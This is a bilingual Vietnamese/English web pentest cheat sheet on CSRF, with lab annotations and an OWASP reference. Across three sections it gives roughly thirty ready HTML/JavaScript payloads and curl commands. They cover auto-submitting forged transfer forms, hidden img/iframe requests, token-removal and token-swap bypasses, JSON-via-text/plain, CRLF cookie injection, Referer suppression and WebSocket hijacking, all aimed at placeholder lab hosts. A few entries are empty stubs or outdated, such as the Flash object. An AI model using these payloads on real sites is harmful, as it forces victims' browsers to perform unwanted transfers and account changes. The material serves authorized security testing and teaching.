# 11. CSRF (Cross-Site Request Forgery)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

CSRF (Cross-Site Request Forgery) xảy ra khi ứng dụng cho phép thực hiện các hành động nhạy cảm thông qua các request từ trình duyệt của nạn nhân mà không xác thực nguồn gốc request (Origin/Token), cho phép kẻ tấn công ép trình duyệt nạn nhân gửi request ngoài ý muốn.

### 11.1. Basic GET & POST CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện trên các chức năng thay đổi trạng thái (như đổi mật khẩu, chuyển khoản) không có cơ chế bảo vệ chống CSRF, và ứng dụng hoàn toàn dựa trên Cookie phiên làm việc mặc định của trình duyệt.
    *   *English*: Found on state-changing requests lacking CSRF tokens, relying solely on standard session cookies.

<!-- payload-id: CHEAT-11-001 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.1. Basic GET & POST CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable browser session increments the synthetic state counter once; the fixed endpoint requires a valid CSRF proof and leaves it unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Send a simulated GET CSRF request using curl
    curl "http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker"
    # Send a simulated POST CSRF request using curl
    curl -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Dựng một trang HTML kiểm thử chứa các thẻ tự động gửi request đến ứng dụng mục tiêu và xem yêu cầu có được thực thi thành công hay không.
    *   *English*: Construct a simple HTML test page that triggers requests to target routes when loaded in a session.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-11-002 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.1. Basic GET & POST CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the vulnerable browser session increments the synthetic state counter once; the fixed endpoint requires a valid CSRF proof and leaves it unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. GET CSRF via Image tag -->
    <img src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" width="0" height="0" />

    <!-- 2. GET CSRF via Audio tag -->
    <audio src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" autoplay></audio>

    <!-- 3. GET CSRF via Video tag -->
    <video src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" autoplay></video>

    <!-- 4. GET CSRF via Link tag (pre-fetching resources) -->
    <link rel="prefetch" href="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 5. GET CSRF via Iframe tag -->
    <iframe src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" style="display:none;"></iframe>

    <!-- 6. Basic POST CSRF via HTML Form auto-submit -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 7. SameSite Lax Bypass via GET-to-POST method conversion (changing method to GET in form) -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="GET">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 8. POST CSRF via JavaScript fetch API (CORS must allow credentials) -->
    <script>
      fetch('http://victim.lab.test/api/v1/transfer', {
        method: 'POST',
        credentials: 'include',
        body: new URLSearchParams({amount: '1000', to: 'attacker'})
      });
    </script>

    <!-- 9. POST CSRF using multipart/form-data to bypass standard check -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 10. SameSite Lax Bypass via user interaction click coercion -->
    <a href="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" id="exploitLink">Claim Reward</a>
    <script>document.getElementById("exploitLink").click();</script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tính năng "Generate CSRF PoC" của Burp Suite Professional để tạo nhanh tệp HTML khai thác.
    *   *English*: Use Burp Suite Professional's "Generate CSRF PoC" action in Engagement tools to automate exploit page setup.


---

### 11.2. Token Bypass CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng có sử dụng CSRF tokens nhưng cơ chế kiểm tra mã token ở máy chủ có lỗi logic.
    *   *English*: CSRF tokens are implemented in parameters, but the server's validation logic contains vulnerabilities.

<!-- payload-id: CHEAT-11-003 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.2. Token Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: missing, empty, duplicated or cross-session tokens are rejected while the matching session-bound token succeeds -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Submit a request with the CSRF token parameter completely removed
    curl -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    # Submit a request with an empty CSRF token parameter
    curl -X POST -d "amount=1000&to=attacker&csrf_token=" http://victim.lab.test/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử xóa tham số token, gửi token rỗng, thay đổi phương thức yêu cầu hoặc thử đổi kiểu Content-Type.
    *   *English*: Try omitting the token parameter, passing an empty token, changing POST to GET, or mapping requests to alternative Content-Types.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-11-004 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.2. Token Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: missing, empty, duplicated or cross-session tokens are rejected while the matching session-bound token succeeds -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. CSRF Token parameter completely removed from request -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 2. CSRF Token provided with an empty value -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 3. Change request method from POST to GET to bypass token check -->
    <img src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 4. Swap csrf_token with another user's valid session token -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_OTHER_USER" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. Static or expired token reuse bypass -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="REUSED_STATIC_TOKEN" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 6. Token pattern guessing bypass using predictable timestamps or MD5 -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="c4ca4238a0b923820dcc509a6f75849b" /> <!-- MD5 of '1' -->
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 7. Swap content type from application/json to application/x-www-form-urlencoded -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 8. JSON CSRF with text/plain enctype (avoids preflight check) -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST" enctype="text/plain">
      <input type="hidden" name='{"amount": 1000, "to": "attacker", "dummy": "' value='test"}' />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. Preflight bypass by setting custom header mapping via Flash or plugins -->
    <object data="http://victim.lab.test/api/v1/transfer" type="application/x-shockwave-flash">
      <param name="flashvars" value="csrf=1" />
    </object>

    <!-- 10. CSRF Token leak via Referer header extraction script -->
    <script>
      // Attacker site script extracting leaked token from history/referrer
      console.log("Leaked referrer: " + document.referrer);
    </script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder để thực hiện lặp lại request loại bỏ hoặc chỉnh sửa các giá trị token tự động.
    *   *English*: Run Burp Suite Intruder to strip, empty, or cycle CSRF parameters dynamically.


---

### 11.3. Cookie & Origin Bypass CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng sử dụng cơ chế bảo vệ Double Submit Cookie hoặc chỉ kiểm tra Referer/Origin headers.
    *   *English*: Target application validates referer/origin headers or applies Double Submit Cookie protection.

<!-- payload-id: CHEAT-11-005 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.3. Cookie & Origin Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the fixed endpoint rejects untrusted/missing Origin and attacker-controlled double-submit values; only the valid same-origin control changes state -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Test Origin header bypass by modifying the Origin header in a request
    curl -H "Origin: http://callback.lab.test" -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Sử dụng XSS trên subdomain để ghi đè Cookie, hoặc dùng thẻ Referrer-Policy để ẩn header Referer.
    *   *English*: Exploit XSS on subdomains to inject cookie strings or deploy meta tags to drop Referer headers.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-11-006 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.3. Cookie & Origin Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the fixed endpoint rejects untrusted/missing Origin and attacker-controlled double-submit values; only the valid same-origin control changes state -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Model a flawed double-submit comparison without changing browser cookies -->
    <script>
      document.body.dataset.sechubCandidateToken = "synthetic-token";
    </script>

    <!-- 2. Double Submit Cookie Bypass using CRLF injection to set cookie on target domain -->
    <a href="http://victim.lab.test/redirect?url=/%0d%0aSet-Cookie:%20csrf_token=attackertoken;%20Domain=.victim.lab.test">Set Token Cookie</a>

    <!-- 3. Referer header bypass via Referrer Policy Meta tag (suppressing Referer) -->
    <meta name="referrer" content="no-referrer" />
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 4. Referer header bypass via Regex Subdomain Spoofing -->
    <!-- Host this exploit file on: http://victim.lab.test.callback.lab.test/exploit.html -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. SameSite Lax Bypass via Open Redirect helper -->
    <script>
      window.location = "http://victim.lab.test/redirect?url=http://victim.lab.test/api/v1/transfer?amount=1000";
    </script>

    <!-- 6. Cross-Site WebSocket Hijacking (CSWSH) basic exploit -->
    <script>
      var ws = new WebSocket("ws://victim.lab.test/api/v1/chat");
      ws.onopen = function() { ws.send("Hello"); };
    </script>

    <!-- 7. Origin header spoofing using custom HTTP headers (for server-to-server proxies) -->
    <script>
      // Triggered on vulnerable node server proxying request
    </script>

    <!-- 8. Referer regex bypass containing path segment -->
    <!-- Host this file on: http://callback.lab.test/victim.lab.test/exploit.html -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. CSWSH with origin validation bypass using custom subdomains -->
    <script>
      var ws = new WebSocket("ws://sub.victim.lab.test/api/v1/chat");
    </script>

    <!-- 10. SameSite Lax bypass via client-side cookie manipulation in target site -->
    <script>
      // Exploit page setting cookies dynamically before redirecting
    </script>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Repeater để kiểm tra phản hồi của máy chủ khi loại bỏ hoặc thay đổi Header Origin/Referer.
*   *English*: Use Burp Suite Repeater to verify server response when Origin or Referer header modifications are performed.

---

## Tài liệu tham khảo

- **[S1]** OWASP Cross-Site Request Forgery Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
